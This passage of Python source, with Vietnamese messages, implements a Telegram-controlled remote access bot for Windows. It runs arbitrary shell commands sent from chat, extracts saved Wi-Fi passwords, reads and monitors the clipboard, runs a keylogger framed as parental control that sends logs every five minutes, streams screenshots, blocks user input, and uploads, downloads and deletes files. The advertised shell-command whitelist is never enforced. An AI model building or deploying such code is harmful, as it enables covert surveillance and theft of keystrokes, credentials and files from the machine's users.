    """Interactive shell command handler - B8 fixed: clear pending handlers first"""
    if m.from_user.id != ADMIN_ID:
        return

    try:
        # Cancel any pending next_step handlers to prevent accumulation
        bot.clear_step_handler_by_chat_id(m.chat.id)
        bot.send_message(
            m.chat.id,
            f"🖥️ Gửi lệnh shell.\n📋 Ví dụ: `dir`, `ipconfig`, `tasklist`\n"
            f"ℹ️ Gõ /cmdlist để xem toàn bộ lệnh cho phép.",
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(m, process_cmd)
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_cmd failed: {e}")

def process_cmd(m):
    """Process shell command"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        if m.text.startswith('/'):
            return
        
        # Run command with timeout
        import subprocess
        result = subprocess.run(m.text, shell=True, capture_output=True, text=True, timeout=10, encoding='cp850', errors='ignore')
        
        output = result.stdout if result.stdout else "(No output)"
        if len(output) > 4000:
            with open("cmd_output.txt", "w", encoding="utf-8") as f:
                f.write(output)
            bot.send_document(m.chat.id, open("cmd_output.txt", 'rb'), caption=f"Output: {m.text}")
            import os
            os.remove("cmd_output.txt")
        else:
            bot.send_message(m.chat.id, f"```\n{output}\n```", parse_mode="Markdown")
    except subprocess.TimeoutExpired:
        bot.send_message(m.chat.id, "⏱️ Lệnh timeout (>10s)")
    except Exception as e:
        bot.send_message(m.chat.id, f"❌ Lỗi: {str(e)}")


def send_power_confirmation(chat_id, action):
    """Send confirmation inline buttons for shutdown/restart"""
    label = "Khởi động lại" if action == "reboot" else "Tắt máy"
    mk = types.InlineKeyboardMarkup()
    mk.add(
        types.InlineKeyboardButton(f"✅ Có, {label.lower()}", callback_data=f"power|{action}|yes"),
        types.InlineKeyboardButton("❌ Hủy", callback_data="power|cancel")
    )
    bot.send_message(chat_id, f"⚠️ Xác nhận {label}?", reply_markup=mk)

@bot.message_handler(commands=['stop'])
def h_stop(m):
    """/stop — Tắt bot và watchdog hoàn toàn (không tự restart lại)"""
    if m.from_user.id != ADMIN_ID:
        return
    mk = types.InlineKeyboardMarkup()
    mk.add(
        types.InlineKeyboardButton("✅ Tắt bot", callback_data="stop|confirm"),
        types.InlineKeyboardButton("❌ Hủy", callback_data="stop|cancel")
    )
    bot.reply_to(m,
        "⚠️ Tắt bot và watchdog?\n"
        "Bot sẽ **không tự khởi động lại**.",
        reply_markup=mk, parse_mode="Markdown")


@bot.message_handler(func=lambda m: m.text == "🔄 Khởi động lại")
def h_res(m):
    """Reboot system"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        send_power_confirmation(m.chat.id, "reboot")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_res failed: {e}")

@bot.message_handler(func=lambda m: m.text == "🛑 Tắt máy")
def h_off(m):
    """Shutdown system"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        send_power_confirmation(m.chat.id, "shutdown")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_off failed: {e}")

@bot.message_handler(commands=['say'])
def h_say(m):
    """/say [--rate N] [--voice f|m] <text>  — B9 fixed: works multiple times"""
    if m.from_user.id != ADMIN_ID:
        return

    if not TTS_AVAILABLE:
        bot.reply_to(m, "❌ TTS not available (thiếu pyttsx3)")
        return

    raw = m.text.partition(' ')[2].strip()
    if not raw:
        bot.reply_to(m, "ℹ️ Cú pháp: `/say [--rate 150] [--voice f] nội dung`",
                     parse_mode="Markdown")
        return

    # Parse optional flags
    import shlex
    rate = 175
    voice_pref = None   # 'f' = female, 'm' = male
    try:
        parts = shlex.split(raw)
        text_parts = []
        i = 0
        while i < len(parts):
            if parts[i] == '--rate' and i + 1 < len(parts):
                rate = int(parts[i + 1])
                i += 2
            elif parts[i] == '--voice' and i + 1 < len(parts):
                voice_pref = parts[i + 1].lower()
                i += 2
            else:
                text_parts.append(parts[i])
                i += 1
        text = ' '.join(text_parts)
    except Exception:
        text = raw

    if not text:
        bot.reply_to(m, "❌ Không có nội dung để nói.")
        return

    def task():
        try:
            speak_text(text, rate=rate, voice_pref=voice_pref)
            bot.reply_to(m, f"✅ Đã nói: `{text[:80]}`", parse_mode="Markdown")
            bot_stats.increment_command()
        except Exception as e:
            logger.error(f"h_say task failed: {e}")
            bot.reply_to(m, f"❌ Lỗi TTS: {e}")

    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(commands=['msg'])
def h_msg(m):
    """Show message box"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            text = m.text[5:]
            show_message_box(text)
            bot_stats.increment_command()
        except Exception as e:
            logger.error(f"h_msg task failed: {e}")
    
    threading.Thread(target=task, daemon=True).start()

# ==============================================================================
# WIFI & UTILITIES
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "📶 Wi-Fi")
def h_wifi(m):
    """Get WiFi passwords"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            bot.send_message(m.chat.id, "⏳ Đang trích xuất WiFi...")
            wifi_data = grab_wifi_passwords()
            
            if wifi_data:
                outfile = save_wifi_to_file(wifi_data)
                with open(outfile, 'rb') as f:
                    bot.send_document(m.chat.id, f)
                cleanup_media_file(outfile)
                bot_stats.increment_command()
            else:
                bot.send_message(m.chat.id, "❌ Không tìm thấy WiFi")
        except Exception as e:
            logger.error(f"h_wifi task failed: {e}")
            bot.send_message(m.chat.id, f"❌ Lỗi: {e}")
    
    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(func=lambda m: m.text == "📋 Clipboard")
def h_clip(m):
    """Get clipboard"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        data = get_clipboard_contents()
        sent_any = False

        clip_text = data.get("text")
        files = data.get("files") or []
        image_bytes = data.get("image")

        if clip_text:
            if len(clip_text) > 3500:
                with open("clipboard.txt", "w", encoding="utf-8") as f:
                    f.write(clip_text)
                with open("clipboard.txt", "rb") as f:
                    bot.send_document(m.chat.id, f, caption="📋 Clipboard (full text)")
                cleanup_media_file("clipboard.txt")
            else:
                bot.send_message(m.chat.id, f"📋 **Clipboard Text:**\n```\n{clip_text}\n```", parse_mode="Markdown")
            sent_any = True

        if files:
            files_list = "\n".join(files)
            bot.send_message(m.chat.id, f"📂 **Clipboard Files:**\n```\n{files_list}\n```", parse_mode="Markdown")
            sent_any = True

        if image_bytes:
            bio = io.BytesIO(image_bytes)
            bio.name = "clipboard.png"
            bot.send_document(m.chat.id, bio, caption="🖼 Clipboard Image")
            sent_any = True

        if not sent_any:
            bot.send_message(m.chat.id, "⚠️ Clipboard trống hoặc định dạng không hỗ trợ.")

        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_clip failed: {e}")

@bot.message_handler(func=lambda m: m.text == "📍 Vị Trí IP")
def h_loc(m):
    """Get IP location"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        # B3 fixed: use HTTPS
        r = requests.get("https://ip-api.com/json/", timeout=5).json()
        if r.get('status') == 'fail':
            msg_err = r.get('message', 'unknown error')
            bot.send_message(m.chat.id, f"❌ IP API lỗi: {msg_err}\nℹ️ Lý do thường gặp: IP private / rate limit (45 req/phút).")
            return
        lat = r.get('lat', '')
        lon = r.get('lon', '')
        maps_link = f"https://maps.google.com/?q={lat},{lon}" if lat and lon else "N/A"
        msg = (
            f"🌍 **Vị Trí IP**\n"
            f"IP: `{r.get('query', 'N/A')}`\n"
            f"Quốc gia: {r.get('country', 'N/A')} ({r.get('countryCode', '')})\n"
            f"Tỉnh/TP: {r.get('regionName', 'N/A')}\n"
            f"Thành phố: {r.get('city', 'N/A')}\n"
            f"ISP: {r.get('isp', 'N/A')}\n"
            f"Org: {r.get('org', 'N/A')}\n"
            f"Tọa độ: {lat}, {lon}\n"
            f"🗺 [Google Maps]({maps_link})"
        )
        bot.send_message(m.chat.id, msg, parse_mode="Markdown", disable_web_page_preview=True)
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_loc failed: {e}")
        bot.send_message(m.chat.id, "❌ Lỗi IP")

@bot.message_handler(func=lambda m: m.text == "🧱 Khóa Input")
def h_blockinput(m):
    """Lock input"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            import ctypes
            bot.send_message(m.chat.id, "🧱 Đang khóa 10s...")
            ctypes.windll.user32.BlockInput(True)
            time.sleep(10)
            ctypes.windll.user32.BlockInput(False)
            bot.send_message(m.chat.id, "🔓 Mở")
            bot_stats.increment_command()
        except Exception as e:
            logger.error(f"h_blockinput task failed: {e}")

    threading.Thread(target=task, daemon=True).start()

# ==============================================================================
# KEYLOGGER (Parental Control)
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "⌨️ Keylogger")
def h_keylogger_menu(m):
    """Keylogger control panel"""
    if m.from_user.id != ADMIN_ID:
        return

    if not PYNPUT_AVAILABLE:
        bot.send_message(m.chat.id,
            "❌ Keylogger không khả dụng.\n"
            "Cài đặt: `pip install pynput`",
            parse_mode="Markdown")
        return

    kl = get_keylogger(bot, ADMIN_ID, BASE_DIR)
    status = "🟢 ĐANG CHẠY" if kl and kl.is_running() else "🔴 TẮT"

    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("▶️ Bật", callback_data="kl|start"),
        types.InlineKeyboardButton("⏹ Tắt", callback_data="kl|stop"),
    )
    mk.add(
        types.InlineKeyboardButton("📤 Gửi log ngay", callback_data="kl|flush"),
        types.InlineKeyboardButton("📄 Tải file log", callback_data="kl|download"),
    )
    mk.add(types.InlineKeyboardButton("🗑 Xóa log", callback_data="kl|clear"))

    bot.send_message(m.chat.id,
        f"⌨️ **Keylogger** | {status}\n"
        f"📆 Tự gửi mỗi: 5 phút\n"
        f"⚠️ Chỉ dùng cho mục đích quản lý thiết bị của bạn.",
        reply_markup=mk, parse_mode="Markdown"
    )
    bot_stats.increment_command()

# ==============================================================================
# CLIPBOARD MONITOR TOGGLE
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "📋 Автоклип")
@bot.message_handler(commands=['clipmon'])
def cmd_clipmon(m):
    """/clipmon — toggle clipboard auto-monitor"""
    if m.from_user.id != ADMIN_ID:
        return
    try:
        global clipboard_monitor_on
        clipboard_monitor_on = not clipboard_monitor_on
        if monitor:
            monitor.update_flags(clipboard_monitor=clipboard_monitor_on)
        _save_state()
        status = "🟢 BẬT" if clipboard_monitor_on else "🔴 TẮT"
        bot.send_message(m.chat.id, f"📋 Clipboard Monitor: {status}")
        bot_stats.increment_command()
        audit(f"/clipmon {status}", m.from_user.id)
    except Exception as e:
        logger.error(f"cmd_clipmon failed: {e}")

# ==============================================================================
# STREAM (Remote Desktop Lite)
# ==============================================================================

@bot.message_handler(commands=['stream'])
def cmd_stream(m):
    """/stream [interval] — send screenshots every N seconds. /stream stop to stop."""
    if m.from_user.id != ADMIN_ID:
        return
    parts = m.text.split()
    if len(parts) > 1 and parts[1].lower() == "stop":
        ev = active_streams.pop(m.chat.id, None)
        if ev:
            ev.set()
            bot.reply_to(m, "🛑 Đã dừng stream.")
        else:
            bot.reply_to(m, "ℹ️ Không có stream nào đang chạy.")
        return

    try:
        interval = max(2, min(30, int(parts[1]))) if len(parts) > 1 else 5
    except (ValueError, IndexError):
        interval = 5

    if m.chat.id in active_streams:
        bot.reply_to(m, "⚠️ Stream đang chạy. Gửi /stream stop để dừng.")
        return

    stop_ev = threading.Event()
    active_streams[m.chat.id] = stop_ev

    def stream_task(cid=m.chat.id, sev=stop_ev, ivl=interval):
        # Inline stop button message
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("🛑 Dừng Stream", callback_data="stream|stop"))
        try:
            ctrl_msg = bot.send_message(cid,
                f"📺 Stream bắt đầu | mỗi {ivl}s | /stream stop để dừng",
                reply_markup=mk)
        except Exception:
            ctrl_msg = None

        count = 0
        while not sev.is_set():
            try:
                img_data = smart_screenshot()
                if img_data:
                    bio = io.BytesIO(img_data)
                    bio.name = f"stream_{count}.png"
                    bot.send_photo(cid, bio, caption=f"📺 #{count+1}")
                    count += 1
            except Exception as e:
                logger.debug(f"stream_task send error: {e}")
            sev.wait(ivl)

        active_streams.pop(cid, None)
        if ctrl_msg:
            try:
                bot.edit_message_text(f"🛑 Stream kết thúc ({count} ảnh)",
                                      cid, ctrl_msg.message_id)
            except Exception:
                pass

    threading.Thread(target=stream_task, daemon=True).start()
    bot.reply_to(m, f"📺 Stream bắt đầu mỗi {interval}s. Dùng /stream stop để dừng.")
    bot_stats.increment_command()
    audit(f"/stream {interval}", m.from_user.id)

# ==============================================================================
# HOT-RELOAD CONFIG
# ==============================================================================

@bot.message_handler(commands=['reload'])
def cmd_reload(m):
    """/reload — reload .env and update API config at runtime"""
    if m.from_user.id != ADMIN_ID:
        return
    try:
        from dotenv import load_dotenv
        env_path = os.path.join(BASE_DIR, ".env")
        if not os.path.exists(env_path):
            bot.reply_to(m, "⚠️ Không tìm thấy file .env")
            return
        load_dotenv(env_path, override=True)
        new_token = os.getenv("API_TOKEN", "")
        if new_token and new_token != API_TOKEN:
            bot.reply_to(m,
                "✅ .env đã tải lại.\n"
                "⚠️ API_TOKEN thay đổi — cần khởi động lại bot để áp dụng token mới.")
        else:
            bot.reply_to(m, "✅ .env đã tải lại (không có thay đổi token).")
        # Update mutable config values
        config['MONITOR_INTERVAL']    = float(os.getenv("MONITOR_INTERVAL", MONITOR_INTERVAL))
        config['CPU_ALERT_THRESHOLD'] = float(os.getenv("CPU_ALERT_THRESHOLD", CPU_ALERT_THRESHOLD))
        config['CPU_ALERT_COOLDOWN']  = float(os.getenv("CPU_ALERT_COOLDOWN", CPU_ALERT_COOLDOWN))
        bot_stats.increment_command()
        audit("/reload", m.from_user.id)
        logger.info("Config hot-reloaded from .env")
    except Exception as e:
        logger.error(f"cmd_reload failed: {e}")
        bot.reply_to(m, f"❌ {e}")

# ==============================================================================
# BLOCKING MANAGEMENT
# ==============================================================================

@bot.message_handler(commands=['block', 'unblock'])
def block_mgr(m):
    """Manage blocked apps/sites"""
    if m.from_user.id != ADMIN_ID:
        return

    try:
        parts = m.text.split()
        if len(parts) < 3:
            bot.reply_to(m, "❌ Sai cú pháp: /block app <item1> <item2> ...")
            return
        
        cmd, type_, targets = parts[0], parts[1], parts[2:]
        if type_ not in ("app", "site"):
            bot.reply_to(m, "❌ Loại phải là app hoặc site")
            return
        key = "apps" if type_ == "app" else "sites"
        targets = [t.lower() for t in targets if t.strip()]
        if not targets:
            bot.reply_to(m, "❌ Chưa có tên để chặn/gỡ")
            return
        
        added = []
        existed = []
        removed = []
        missing = []
        failed = []
        
        if cmd == "/block":
            for t in targets:
                if t not in BLOCKED_DATA[key]:
                    BLOCKED_DATA[key].append(t)
                    # Only apply firewall/hosts immediately if block mode is active
                    if type_ == "site" and block_mode_active and not block_site(t):
                        failed.append(t)
                        continue
                    added.append(t)
                else:
                    existed.append(t)
            save_blocked_list(BLOCKED_FILE, BLOCKED_DATA)
        else:  # unblock
            for t in targets:
                if t in BLOCKED_DATA[key]:
                    BLOCKED_DATA[key].remove(t)
                    # Always remove firewall/hosts when explicitly unblocking
                    if type_ == "site" and not unblock_site(t):
                        failed.append(t)
                        continue
                    removed.append(t)
                else:
                    missing.append(t)
            save_blocked_list(BLOCKED_FILE, BLOCKED_DATA)
        
        messages = []
        if added:
            messages.append("✅ Đã chặn: " + ", ".join(added))
        if removed:
            messages.append("🗑 Đã gỡ: " + ", ".join(removed))
        if existed:
            messages.append("⚠️ Đã có: " + ", ".join(existed))
        if missing:
            messages.append("⚠️ Không thấy: " + ", ".join(missing))
        if failed:
            messages.append("⚠️ Thao tác thất bại (cần quyền admin hosts/firewall?): " + ", ".join(failed))
        
        if messages:
            bot.reply_to(m, "\n".join(messages))
        else:
            bot.reply_to(m, "ℹ️ Không có thay đổi.")
        
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"block_mgr failed: {e}")
        bot.reply_to(m, f"❌ Lỗi: {e}")

@bot.message_handler(commands=['volume'])
def h_volume(m):
    """/volume [0-100|up|down|max|mute] — Điều chỉnh âm lượng hệ thống"""
    if m.from_user.id != ADMIN_ID:
        return
    try:
        import ctypes
        from ctypes import POINTER, cast
        # pythoncom-free volume control via Windows IAudioEndpointVolume
        try:
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            from comtypes import CLSCTX_ALL
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            USE_PYCAW = True
        except Exception:
            USE_PYCAW = False

        parts = m.text.split(maxsplit=1)
        arg = parts[1].strip().lower() if len(parts) > 1 else "status"

        def _wsh_keys(key_code, times=1):
            """Simulate media key presses via WScript.Shell COM object"""
            import subprocess
            ps = (
                f"$wsh = New-Object -ComObject WScript.Shell; "
                f"1..{times} | ForEach-Object {{ $wsh.SendKeys([char]{key_code}) }}"
            )
            subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                           creationflags=subprocess.CREATE_NO_WINDOW, timeout=10, check=False)

        def _ps_set_volume(level_pct):
            """Set exact volume % via PowerShell Windows Audio native COM — no pycaw needed"""
            import subprocess
            ps = (
                "Add-Type -TypeDefinition @'"
                "using System.Runtime.InteropServices;"
                "[Guid(\"5CDF2C82-841E-4546-9722-0CF74078229A\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]"
                "interface IAudioEndpointVolume { int f(); int g(); int h(); int i();"
                "  int SetMasterVolumeLevelScalar(float f, System.Guid g); int j();"
                "  int GetMasterVolumeLevelScalar(out float f); int SetMute(int b, System.Guid g); }"
                "[Guid(\"BCDE0395-E52F-467C-8E3D-C4579291692E\")]"
                "class MMDeviceEnumerator {} "
                "public class Audio {"
                "  public static void SetVolume(double v) {"
                "    var t = Type.GetTypeFromCLSID(new System.Guid(\"BCDE0395-E52F-467C-8E3D-C4579291692E\"));"
                "    var e = (dynamic)Activator.CreateInstance(t);"
                "    var d = e.GetDefaultAudioEndpoint(0,1);"
                "    var vol = (IAudioEndpointVolume)d.Activate(typeof(IAudioEndpointVolume).GUID,23,null);"
                "    vol.SetMasterVolumeLevelScalar((float)(v/100.0), System.Guid.Empty);"
                "    vol.SetMute(0, System.Guid.Empty); } }"
                "'@ -Language CSharp -ErrorAction SilentlyContinue; "
                f"[Audio]::SetVolume({level_pct})"
            )
            result = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                                    capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=15)
            return result.returncode == 0

        if arg in ("status", ""):
            if USE_PYCAW:
                cur = round(volume.GetMasterVolumeLevelScalar() * 100)
                muted = volume.GetMute()
                bot.reply_to(m, f"🔊 Âm lượng hiện tại: **{cur}%**{'  🔇 (đang mute)' if muted else ''}",
                             parse_mode="Markdown")
            else:
                bot.reply_to(m, "ℹ️ Cú pháp: /volume [0-100|up|down|max|mute|unmute|status]")
            return

        if arg == "mute":
            if USE_PYCAW:
                volume.SetMute(1, None)
            else:
                _wsh_keys(173)  # VK_VOLUME_MUTE
            bot.reply_to(m, "🔇 Đã tắt tiếng.")
        elif arg == "unmute":
            if USE_PYCAW:
                volume.SetMute(0, None)
            else:
                _wsh_keys(173)  # toggle mute again
            bot.reply_to(m, "🔊 Đã bật tiếng.")
        elif arg == "max":
            if USE_PYCAW:
                volume.SetMasterVolumeLevelScalar(1.0, None)
                volume.SetMute(0, None)
            else:
                _wsh_keys(175, 50)  # VK_VOLUME_UP x50
            bot.reply_to(m, "🔊 Âm lượng tối đa (100%).")
        elif arg == "up":
            if USE_PYCAW:
                cur = volume.GetMasterVolumeLevelScalar()
                volume.SetMasterVolumeLevelScalar(min(1.0, cur + 0.1), None)
                volume.SetMute(0, None)
                new_val = round(volume.GetMasterVolumeLevelScalar() * 100)
            else:
                _wsh_keys(175, 5)
                new_val = "?"
            bot.reply_to(m, f"🔊 Tăng âm lượng → {new_val}%")
        elif arg == "down":
            if USE_PYCAW:
                cur = volume.GetMasterVolumeLevelScalar()
                volume.SetMasterVolumeLevelScalar(max(0.0, cur - 0.1), None)
                new_val = round(volume.GetMasterVolumeLevelScalar() * 100)
            else:
                _wsh_keys(174, 5)
                new_val = "?"
            bot.reply_to(m, f"🔉 Giảm âm lượng → {new_val}%")
        else:
            try:
                level = int(arg)
                if not 0 <= level <= 100:
                    raise ValueError
                if USE_PYCAW:
                    volume.SetMasterVolumeLevelScalar(level / 100.0, None)
                    volume.SetMute(0, None)
                else:
                    # Fallback: PowerShell native Windows Audio COM (no pycaw needed)
                    if not _ps_set_volume(level):
                        # Last resort: SendKeys up/down estimation
                        _wsh_keys(173)        # mute
                        _wsh_keys(173)        # unmute
                        _wsh_keys(174, 50)    # volume down to 0
                        steps = round(level / 2)  # each press ~2%
                        if steps > 0:
                            _wsh_keys(175, steps)
                bot.reply_to(m, f"🔊 Âm lượng đã đặt: **{level}%**", parse_mode="Markdown")
            except ValueError:
                bot.reply_to(m, "❌ Giá trị không hợp lệ. Dùng: /volume [0-100|up|down|max|mute|unmute|status]")
        audit(f"/volume {arg}", m.from_user.id)
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_volume failed: {e}")
        bot.reply_to(m, f"❌ Lỗi: {e}")


@bot.message_handler(commands=['cmdlist'])
def cmd_list(m):
    """Show allowed shell commands"""
    if m.from_user.id != ADMIN_ID:
        return
    cmds = sorted(SHELL_WHITELIST)
    lines = [cmds[i:i+5] for i in range(0, len(cmds), 5)]
    text = "📋 **Lệnh shell được phép:**\n" + "\n".join([", ".join(row) for row in lines])
    bot.reply_to(m, text, parse_mode="Markdown")

# ==============================================================================
# CALLBACK HANDLER
# ==============================================================================

@bot.message_handler(content_types=['document'])
def handle_upload(m):
    """Handle file upload"""
    if m.from_user.id != ADMIN_ID:
        return

    if m.chat.id not in upload_state:
        return

    try:
        if m.document.file_size / (1024 * 1024) > 19.5:
            bot.reply_to(m, "❌ File > 20MB")
            return

        target_dir = upload_state[m.chat.id]
        file_name = m.document.file_name

        bot.reply_to(m, "⏳ Đang tải...")
        file_info = bot.get_file(m.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        filepath = os.path.join(target_dir, file_name)
        with open(filepath, 'wb') as f:
            f.write(downloaded_file)

        bot.reply_to(m, f"✅ Đã lưu vào `{target_dir}`", parse_mode="Markdown")
        del upload_state[m.chat.id]
        bot_stats.increment_command()
        logger.info(f"File uploaded: {filepath}")

    except Exception as e:
        logger.error(f"File upload failed: {e}")
        bot.reply_to(m, f"❌ Lỗi: {e}")

@bot.callback_query_handler(func=lambda c: c.from_user.id == ADMIN_ID)
def cb_handler(c):
    """Callback handler — file browser (paginated), power, peek, delete"""
    data = c.data
    msg = c.message
    cid = msg.chat.id

    try:
        # noop (page indicator button)
        if data == "noop":
            bot.answer_callback_query(c.id)
            return

        # Stream stop button
        if data == "stream|stop":
            ev = active_streams.pop(cid, None)
            if ev:
                ev.set()
                bot.answer_callback_query(c.id, "🛑 Đã dừng stream")
                bot.edit_message_reply_markup(cid, msg.message_id, reply_markup=None)
            else:
                bot.answer_callback_query(c.id, "ℹ️ Không có stream")
            return

        # Keylogger controls — format: kl|action
        if data.startswith("kl|"):
            action = data.split("|", 1)[1]
            kl = get_keylogger(bot, ADMIN_ID, BASE_DIR)

            if action == "start":
                if not PYNPUT_AVAILABLE:
                    bot.answer_callback_query(c.id, "❌ pynput not installed")
                    return
                if kl is None:
                    from keylogger import Keylogger
                    import keylogger as kl_mod
                    kl_mod._keylogger_instance = Keylogger(bot, ADMIN_ID, BASE_DIR)
                    kl = kl_mod._keylogger_instance
                kl.start()
                bot.answer_callback_query(c.id, "▶️ Keylogger bật")
                bot.send_message(cid, "⌨️ Keylogger **đã bật**. Tự gửi log mỗi 5 phút.",
                                 parse_mode="Markdown")

            elif action == "stop":
                if kl:
                    kl.stop()
                bot.answer_callback_query(c.id, "⏹ Đã tắt")
                bot.send_message(cid, "⌨️ Keylogger **đã tắt**.", parse_mode="Markdown")

            elif action == "flush":
                if kl and kl.is_running():
                    bot.answer_callback_query(c.id, "📤 Đang gửi...")
                    sent = kl.flush_and_send("manual")
                    if not sent:
                        bot.send_message(cid, "ℹ️ Buffer trống, chưa có keystroke nào.")
                else:
                    bot.answer_callback_query(c.id, "❌ Keylogger chưa bật")

            elif action == "download":
                if kl:
                    log_path = kl.get_log_file_path()
                    if os.path.exists(log_path):
                        bot.answer_callback_query(c.id, "📄 Gửi file...")
                        with open(log_path, 'rb') as f:
                            bot.send_document(cid, f, caption="📄 keylog.txt (full history)")
                    else:
                        bot.answer_callback_query(c.id, "ℹ️ Log file trống")
                        bot.send_message(cid, "ℹ️ Chưa có log file nào.")
                else:
                    bot.answer_callback_query(c.id, "❌ Keylogger chưa khởi tạo")

            elif action == "clear":
                if kl:
                    import keylogger as kl_mod
                    with kl._lock:
                        kl._buffer.clear()
                    log_path = kl.get_log_file_path()
                    if os.path.exists(log_path):
                        os.remove(log_path)
                bot.answer_callback_query(c.id, "🗑 Đã xóa")
                bot.send_message(cid, "🗑 Log keylogger đã được xóa.")
            return

        # Stop bot + watchdog
        if data.startswith("stop|"):
            action = data.split("|", 1)[1]
            bot.answer_callback_query(c.id)
            if action == "confirm":
                bot.send_message(cid, "🛑 Bot đang tắt...")
                audit("/stop confirmed", c.from_user.id)
                # Kill watchdog (parent process) if running as frozen EXE
                try:
                    if getattr(sys, 'frozen', False):
                        parent = psutil.Process(os.getpid()).parent()
                        if parent:
                            parent.terminate()
                except Exception:
                    pass
                # Also kill by name fallback
                try:
                    for proc in psutil.process_iter(['name']):
                        if proc.info.get('name', '').lower() in ('watchdog.exe',):
                            proc.terminate()
                except Exception:
                    pass
                import time as _t
                _t.sleep(0.5)
                os._exit(0)
            else:
                bot.send_message(cid, "❌ Đã hủy.")
            return

        # Power confirmation
        if data.startswith("power|"):
            parts = data.split("|")
            action = parts[1] if len(parts) > 1 else ""
            decision = parts[2] if len(parts) > 2 else ""
            bot.answer_callback_query(c.id, "✅")
            if decision == "yes":
                cmd = "shutdown /r /t 5" if action == "reboot" else "shutdown /s /t 5"
                os.system(cmd)
                bot.send_message(cid, "🛑 Hệ thống sẽ tắt/khởi động lại sau 5 giây.")
            else:
                bot.send_message(cid, "❌ Đã hủy.")
            return

        # Directory browse — format: d|path|page
        if data.startswith("d|"):
            parts = data.split("|")
            path = parts[1] if len(parts) > 1 else ""
            page = int(parts[2]) if len(parts) > 2 else 0
            if not _is_path_allowed(path):
                bot.answer_callback_query(c.id, "⛔ Không hợp lệ")
                return
            bot.answer_callback_query(c.id, "✅")
            try:
                bot.delete_message(cid, msg.message_id)
            except:
                pass
            list_dir(cid, path, page)
            return

        # File download — format: f|filepath
        if data.startswith("f|"):
            filepath = data.split("|", 1)[1]
            if not _is_path_allowed(filepath):
                bot.answer_callback_query(c.id, "⛔ Không hợp lệ")
                return
            bot.answer_callback_query(c.id, "⬇️ Đang gửi...")

            def download_task(fp=filepath):
                try:
                    with open(fp, 'rb') as f:
                        bot.send_document(cid, f)
                    logger.info(f"File sent: {fp}")
                except Exception as e:
                    bot.send_message(cid, f"❌ Lỗi tải file: {e}")

            threading.Thread(target=download_task, daemon=True).start()
            return

        # Quick peek — show first 50 lines of text files
        if data.startswith("peek|"):
            filepath = data.split("|", 1)[1]
            if not _is_path_allowed(filepath):
                bot.answer_callback_query(c.id, "⛔ Không hợp lệ")
                return
            bot.answer_callback_query(c.id, "👁 Đang xem...")
            try:
                ext = os.path.splitext(filepath)[1].lower()
                text_exts = {'.txt', '.log', '.json', '.ini', '.cfg', '.xml',
                             '.py', '.js', '.html', '.css', '.md', '.csv', '.bat', '.ps1'}
                if ext not in text_exts:
                    bot.send_message(cid, f"⚠️ Không hỗ trợ xem nhanh định dạng `{ext}`. Nhấn ⬇️ Tải về.",
                                     parse_mode="Markdown")
                    return
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()[:50]
                content = "".join(lines)
                if len(content) > 3800:
                    content = content[:3800] + "\n... (truncated)"
                name = os.path.basename(filepath)
                bot.send_message(cid, f"👁 `{name}`:\n```\n{content}\n```",
                                 parse_mode="Markdown")
            except Exception as e:
                bot.send_message(cid, f"❌ Không đọc được: {e}")
            return

        # Delete — ask confirmation first
        if data.startswith("del|"):
            target = data.split("|", 1)[1]
            if not _is_path_allowed(target):
                bot.answer_callback_query(c.id, "⛔ Không hợp lệ")
                return
            bot.answer_callback_query(c.id, "⚠️")
            name = os.path.basename(target)
            mk = types.InlineKeyboardMarkup()
            mk.add(
                types.InlineKeyboardButton("✅ Xác nhận xóa", callback_data=f"confirm_del|{target}"),
                types.InlineKeyboardButton("❌ Hủy", callback_data="noop")
            )
            bot.send_message(cid, f"⚠️ Xác nhận xóa `{name}`?", reply_markup=mk, parse_mode="Markdown")
            return

        # Confirm delete
        if data.startswith("confirm_del|"):
            target = data.split("|", 1)[1]
            if not _is_path_allowed(target):
                bot.answer_callback_query(c.id, "⛔ Không hợp lệ")
                return
            bot.answer_callback_query(c.id, "🗑 Đang xóa...")
            try:
                if os.path.isdir(target):
                    import shutil
                    shutil.rmtree(target)
                else:
                    os.remove(target)
                name = os.path.basename(target)
                bot.edit_message_text(f"✅ Đã xóa: `{name}`", cid, msg.message_id,
                                      parse_mode="Markdown")
                logger.info(f"Deleted: {target}")
            except Exception as e:
                bot.send_message(cid, f"❌ Xóa thất bại: {e}")
            return

        # File upload
        if data.startswith("up|"):
            target_path = data.split("|", 1)[1]
            upload_state[cid] = target_path
            bot.answer_callback_query(c.id, "✅")
            bot.send_message(cid, f"📤 Gửi file (<20MB) để lưu vào: `{target_path}`",
                             parse_mode="Markdown")
            return

        logger.warning(f"Unknown callback: {data}")
